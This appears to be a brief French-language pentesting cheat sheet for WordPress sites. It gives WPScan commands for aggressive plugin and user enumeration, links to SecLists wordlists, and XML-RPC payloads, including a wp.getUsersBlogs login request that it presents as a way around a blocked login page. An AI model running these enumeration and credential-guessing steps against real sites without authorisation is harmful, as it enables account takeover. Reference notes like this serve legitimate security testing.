## Énumération avec WPScan

	wpscan --url https://www.site.fr --enumerate --plugins-detection aggressive
	wpscan --url https://www.site.fr --enumerate --plugins-detection aggressive --api-token $TOKEN

## Wordlists

- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt 
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

## XML-RPC

La page xmlrpc.php peut aussi servir à s'authentifier si le login traditionnel est bloqué.

### Payload initial

```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

### Payload de login 

```
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
